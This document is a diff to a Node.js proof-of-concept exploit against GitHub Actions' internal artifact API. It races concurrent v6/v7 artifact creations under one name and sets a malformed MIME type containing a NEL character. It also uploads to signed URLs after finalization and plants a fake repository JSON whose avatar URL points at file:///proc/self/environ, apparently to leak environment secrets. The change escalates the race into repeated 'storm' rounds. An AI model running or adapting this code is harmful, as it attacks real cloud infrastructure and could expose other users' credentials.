@@ -5,101 +5,85 @@ import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/inte
 import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';
 
 const ids = getBackendIdsFromToken();
-const client = internalArtifactTwirpClient();
-const nelJson = '\u0085application/json';
-const repo = process.env.GITHUB_REPOSITORY;
+const oddMime = 'application/json\u0085';
+const validMime = 'application/json';
+const payload = Buffer.from(JSON.stringify({
+  full_name: 'pwn/repo',
+  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
+  description: 'Repo Cassette artifact race carrier',
+  stargazers_count: 0,
+}));
+const digest = createHash('sha256').update(payload).digest('hex');
 
-function payload(artifactId) {
-  return Buffer.from(JSON.stringify({
-    full_name: `${repo}/actions/artifacts/${artifactId}/zip`,
-    owner: {
-      login: 'cassette',
-      avatar_url: 'file:///proc/self/environ',
-    },
-    description: 'Repo Cassette artifact',
-    stargazers_count: 0,
-  }));
+function client() {
+  // Separate clients give concurrent creates independent socket pools.
+  return internalArtifactTwirpClient({maxAttempts: 1});
 }
 
-async function createArtifact(name, version, mimeType) {
-  const response = await client.CreateArtifact({
+async function create(name, version) {
+  return client().CreateArtifact({
     workflowRunBackendId: ids.workflowRunBackendId,
     workflowJobRunBackendId: ids.workflowJobRunBackendId,
     name,
     version,
-    mimeType: StringValue.create({value: mimeType}),
-  });
-  if (!response.ok) throw new Error('CreateArtifact returned ok=false');
-  return response;
-}
-
-async function upload(signedUrl, bytes) {
-  await new BlobClient(signedUrl).getBlockBlobClient().uploadData(bytes, {
-    blobHTTPHeaders: {blobContentType: nelJson},
+    mimeType: StringValue.create({
+      value: version === 6 ? oddMime : validMime,
+    }),
   });
 }
 
-async function finalize(name, bytes) {
-  const digest = createHash('sha256').update(bytes).digest('hex');
-  const response = await client.FinalizeArtifact({
+async function upload(url) {
+  await new BlobClient(url).getBlockBlobClient().uploadData(payload, {
+    blobHTTPHeaders: {blobContentType: oddMime},
+  });
+}
+
+async function finalize(name) {
+  return client().FinalizeArtifact({
     workflowRunBackendId: ids.workflowRunBackendId,
     workflowJobRunBackendId: ids.workflowJobRunBackendId,
     name,
-    size: String(bytes.length),
+    size: String(payload.length),
     hash: StringValue.create({value: `sha256:${digest}`}),
   });
-  if (!response.ok) throw new Error('FinalizeArtifact returned ok=false');
-  return String(response.artifactId);
 }
 
-async function race(index) {
-  const name = `repo-cassette-${index}-${Date.now()}`;
-  const specs = index % 2
-    ? [[7, 'application/json'], [6, nelJson]]
-    : [[6, nelJson], [7, 'application/json']];
+const report = [];
+for (let round = 0; round < 24; round += 1) {
+  const name = `cassette-storm-${process.env.GITHUB_RUN_ID}-${round}`;
+  const versions = Array.from({length: 32}, (_, index) =>
+    (index + round) % 2 === 0 ? 6 : 7);
 
-  // A shared-name v6/v7 creation race can leave v6 MIME metadata attached to
-  // the v7 raw-delivery artifact. Both orderings are tried repeatedly.
-  const created = await Promise.all(
-    specs.map(([version, mime]) => createArtifact(name, version, mime)),
+  const opened = await Promise.allSettled(versions.map(version => create(name, version)));
+  const handles = opened
+    .filter(item => item.status === 'fulfilled' && item.value?.signedUploadUrl)
+    .map(item => item.value.signedUploadUrl);
+  const urls = [...new Set(handles)];
+  await Promise.allSettled(urls.map(upload));
+
+  const sealed = await Promise.allSettled(
+    Array.from({length: 12}, () => finalize(name)),
   );
-  const placeholder = Buffer.from('{"probe":"placeholder"}');
-  await Promise.all(created.map(item => upload(item.signedUploadUrl, placeholder)));
+  const artifactIds = [...new Set(sealed
+    .filter(item => item.status === 'fulfilled' && item.value?.artifactId)
+    .map(item => String(item.value.artifactId)))];
 
-  const finalized = await Promise.allSettled([
-    finalize(name, placeholder),
-    finalize(name, placeholder),
-  ]);
-  const artifactIds = [...new Set(finalized
-    .filter(item => item.status === 'fulfilled')
-    .map(item => item.value))];
-  if (!artifactIds.length) throw new Error('both FinalizeArtifact calls failed');
-
-  // The signed upload URLs remain writable after finalization.
-  for (const artifactId of artifactIds) {
-    const bytes = payload(artifactId);
-    await Promise.all(created.map(item => upload(item.signedUploadUrl, bytes)));
-  }
-
-  const artifactId = artifactIds.at(-1);
-  return {
+  await Promise.allSettled(urls.map(upload));
+  const extensions = urls.map(url => new URL(url).pathname.split('.').at(-1));
+  const result = {
+    round,
     name,
-    artifactId,
+    fulfilledCreates: handles.length,
+    uniqueBlobs: urls.length,
+    zipBlobs: extensions.filter(x => x === 'zip').length,
+    jsonBlobs: extensions.filter(x => x === 'json').length,
     artifactIds,
-    repository: `${repo}/actions/artifacts/${artifactId}/zip`,
   };
+  report.push(result);
+  console.log(`STORM ${JSON.stringify(result)}`);
 }
 
-const results = [];
-for (let index = 0; index < 64; index += 1) {
-  try {
-    const result = await race(index);
-    results.push(result);
-    console.log(`BUILT ${JSON.stringify(result)}`);
-  } catch (error) {
-    console.log(`SKIPPED ${index}: ${error.message}`);
-  }
+if (!report.some(item => item.artifactIds.length)) {
+  throw new Error('No storm artifact was finalized');
 }
-
-if (!results.length) throw new Error('no race artifact was created');
-console.log(`MANIFEST ${JSON.stringify(results)}`);
+console.log(`MANIFEST ${JSON.stringify(report)}`);
